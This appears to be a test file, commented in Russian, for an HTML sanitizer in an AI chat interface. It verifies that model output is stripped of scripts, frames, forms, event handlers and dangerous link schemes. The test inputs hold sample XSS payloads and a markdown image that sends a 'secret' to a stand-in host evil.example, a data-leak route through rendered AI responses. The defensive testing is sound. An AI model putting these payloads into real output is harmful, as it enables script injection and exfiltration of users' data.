/**
 * Очистка HTML в ответах модели — на настоящем конвейере remark → rehype,
 * в том же порядке, что у Streamdown в message.tsx: raw → sanitize → картинки.
 */
import { describe, expect, it } from "vitest";
import { toHtml } from "hast-util-to-html";
import rehypeRaw from "rehype-raw";
import rehypeSanitize from "rehype-sanitize";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import remarkParse from "remark-parse";
import remarkRehype from "remark-rehype";
import { unified } from "unified";
import type { Root } from "hast";

import { rehypeSameOriginImages, responseSanitizeSchema } from "@/lib/response-html";

async function render(md: string): Promise<string> {
  const processor = unified()
    .use(remarkParse)
    .use(remarkGfm)
    .use(remarkMath)
    .use(remarkRehype, { allowDangerousHtml: true })
    .use(rehypeRaw)
    .use(rehypeSanitize, responseSanitizeSchema)
    .use(rehypeSameOriginImages);
  const tree = (await processor.run(processor.parse(md))) as Root;
  return toHtml(tree);
}

describe("инлайновый HTML из ответа", () => {
  it("скрипты, фреймы, формы и обработчики не доходят до DOM", async () => {
    const html = await render(
      [
        "Текст <script>alert(1)</script> и <iframe src=\"https://evil.example\"></iframe>",
        "<form action=\"https://evil.example\"><input name=q></form>",
        "<img src=\"/outputs/a.png\" onerror=\"alert(1)\">",
        "<a href=\"javascript:alert(1)\">x</a>",
        "<object data=\"https://evil.example/x.swf\"></object>",
      ].join("\n\n"),
    );
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("<form");
    expect(html).not.toContain("<object");
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("javascript:");
    expect(html).toContain('<img src="/outputs/a.png">');
  });

  it("безобидная разметка остаётся: details, таблицы, списки задач", async () => {
    const html = await render(
      "<details><summary>Ещё</summary>скрыто</details>\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- [x] готово",
    );
    expect(html).toContain("<details>");
    expect(html).toContain("<table>");
    expect(html).toContain('type="checkbox"');
  });
});

describe("картинки", () => {
  it("с чужого хоста — ссылка, а не загрузка (и с протокол-относительным адресом тоже)", async () => {
    const html = await render(
      [
        "![утечка](https://evil.example/leak?secret=1)",
        '<img src="//evil.example/leak.png" alt="">',
        '<img src="data:image/png;base64,AAAA">',
      ].join("\n\n"),
    );
    expect(html).not.toContain("<img");
    expect(html).toContain('<a href="https://evil.example/leak?secret=1">утечка</a>');
    expect(html).toContain('<a href="//evil.example/leak.png">//evil.example/leak.png</a>');
    expect(html).not.toContain("data:image");
  });

  it("файл сессии — по-прежнему картинка", async () => {
    const html = await render("![график](/outputs/chart.png)");
    expect(html).toContain('<img src="/outputs/chart.png" alt="график">');
  });
});

describe("ссылки", () => {
  it("file: и tel: переживают очистку, посторонние схемы — нет", async () => {
    const html = await render(
      "[отчёт](file:///outputs/report.pdf) [звонок](tel:+79990000000) [в](vbscript:x) [сайт](https://ya.ru)",
    );
    expect(html).toContain('href="file:///outputs/report.pdf"');
    expect(html).toContain('href="tel:+79990000000"');
    expect(html).not.toContain("vbscript:");
    expect(html).toContain('href="https://ya.ru"');
  });
});

describe("классы, нужные плагинам после очистки", () => {
  it("формулы и подсветка кода сохраняют свои классы", async () => {
    const html = await render("Формула $x$ и\n\n$$\ny\n$$\n\n```python\nprint(1)\n```");
    expect(html).toContain('class="language-math math-inline"');
    expect(html).toContain('class="language-math math-display"');
    expect(html).toContain('class="language-python"');
  });
});
